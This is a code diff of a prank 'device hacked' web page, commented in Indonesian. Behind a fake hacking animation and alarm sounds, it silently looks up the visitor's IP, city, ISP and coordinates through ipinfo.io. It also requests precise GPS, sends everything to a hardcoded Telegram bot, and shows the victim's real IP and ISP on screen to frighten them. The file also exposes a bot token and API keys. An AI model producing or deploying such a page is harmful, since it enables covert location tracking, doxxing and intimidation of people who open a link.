@@ -69,22 +69,24 @@
         const suaraKetik = document.getElementById('suara-ketik');
         const suaraAlert = document.getElementById('suara-alert');
 
-        // --- DATA TELEGRAM ---
+        // --- DATA TELEGRAM & IPINFO ---
         const TOKEN_BOT = "8110303835:AAHEOijWAE5EnMK_mkseIvru6vSbsp3PCUU"; 
         const CHAT_ID = "7332180572"; 
-        // ---------------------
+        const IPINFO_TOKEN = "6dd4d76f655366"; // Token ipinfo.io kamu
+        // ------------------------------
 
-        const pesan = [
+        const pesanAwal = [
             "> Initializing exploit mechanism...",
             "> Establishing secure connection...",
-            "> Bypassing SSL certificate...",
-            "> Searching for vulnerabilities...",
+            "> Bypassing SSL certificate..."
+        ];
+
+        const pesanAkhir = [
             "> [CRITICAL] Internal database accessed!",
             "> Downloading sensitive_data.zip (100%)",
             "> WARNING: Administrator detected!",
             "> Locating target coordinates...",
             "> GPS signal locked...",
-            "> Redirecting IP address...",
             "> ---------------------------------------",
             "> STATUS: YOUR DEVICE HAS BEEN HACKED!",
             "> ---------------------------------------",
@@ -92,53 +94,64 @@
             "> Have a nice day! :P"
         ];
 
-        // 1. Fungsi Kirim Pesan Umum
         function kirimTele(teks) {
             const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`;
             fetch(url).catch(err => console.log("Gagal kirim"));
         }
 
-        // 2. Lapis 1: Ambil Data IP (Tanpa Izin)
-        function ambilDataIP() {
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    const infoIP = `🌐 *INFO IP TARGET*%0A📍 Kota: ${data.city}%0A🇮🇩 Prov: ${data.region}%0A🏢 ISP: ${data.org}%0A🔌 IP: ${data.ip}`;
-                    kirimTele(infoIP);
-                })
-                .catch(() => kirimTele("Gagal mengambil data IP target."));
+        // Lapis 1: IP Tracking (Silent) + Tampilkan di Layar
+        async function ambilDataIP() {
+            try {
+                const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+                const data = await response.json();
+                
+                // Kirim ke Telegram
+                const infoIP = `🌐 *TARGET IP DETECTED (SILENT)*%0A🔌 IP: ${data.ip}%0A🏙️ Kota: ${data.city}%0A🏢 ISP: ${data.org}%0A📍 Lokasi: ${data.loc}`;
+                kirimTele(infoIP);
+
+                // Sisipkan data asli target ke layar simulasi
+                logHacker.innerHTML += `<span style="color: yellow;">> INFILTRATING IP: ${data.ip}...</span><br>`;
+                logHacker.innerHTML += `<span style="color: yellow;">> ACCESSING ISP: ${data.org}...</span><br>`;
+                
+                return true;
+            } catch (err) {
+                kirimTele("Gagal mengambil data IP via ipinfo.");
+                return false;
+            }
         }
 
-        // 3. Lapis 2: Ambil GPS (Pakai Izin)
+        // Lapis 2: GPS (Pakai Izin)
         function ambilGPS() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const infoGPS = `🚨 *LOKASI PRESISI (GPS)*%0A📍 Koordinat: ${lat},${lon}%0A🗺️ Buka di Maps: https://www.google.com/maps?q=${lat},${lon}`;
+                    const infoGPS = `🚨 *LOKASI PRESISI (GPS)*%0A📍 Koordinat: ${lat},${lon}%0A🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}`;
                     kirimTele(infoGPS);
                 }, null, { enableHighAccuracy: true });
             }
         }
 
-        function jalankanTeks(i = 0) {
-            if (i < pesan.length) {
+        // Animasi Teks Bergantian
+        async function jalankanAnimasi(arrayPesan, index = 0) {
+            if (index < arrayPesan.length) {
                 suaraKetik.currentTime = 0;
                 suaraKetik.play().catch(() => {}); 
 
-                if (pesan[i].includes("WARNING") || pesan[i].includes("HACKED")) {
+                if (arrayPesan[index].includes("WARNING") || arrayPesan[index].includes("HACKED")) {
                     suaraAlert.currentTime = 0;
                     suaraAlert.play().catch(() => {});
                 }
 
-                logHacker.innerHTML += pesan[i] + "<br>";
+                logHacker.innerHTML += arrayPesan[index] + "<br>";
                 layarHack.scrollTop = layarHack.scrollHeight;
-                setTimeout(() => jalankanTeks(i + 1), 450);
+                
+                setTimeout(() => jalankanAnimasi(arrayPesan, index + 1), 450);
             }
         }
 
-        gambar.addEventListener('click', () => {
-            // Unlocking Audio
+        gambar.addEventListener('click', async () => {
+            // Audio Unlocking
             suaraKetik.play().then(() => {
                 suaraKetik.pause();
                 suaraAlert.play().then(() => suaraAlert.pause());
@@ -153,10 +166,11 @@
                 document.documentElement.webkitRequestFullscreen();
             }
 
-            // EKSEKUSI MISI
-            ambilDataIP(); // Lapis 1 (Silent)
-            ambilGPS();    // Lapis 2 (Izin)
-            jalankanTeks(); // Animasi
+            // Jalankan urutan aksi
+            await jalankanAnimasi(pesanAwal); // Teks awal
+            await ambilDataIP();              // Ambil IP & Tampilkan di layar
+            ambilGPS();                       // Minta GPS
+            jalankanAnimasi(pesanAkhir);      // Teks akhir
         });
 
         layarHack.addEventListener('click', () => {
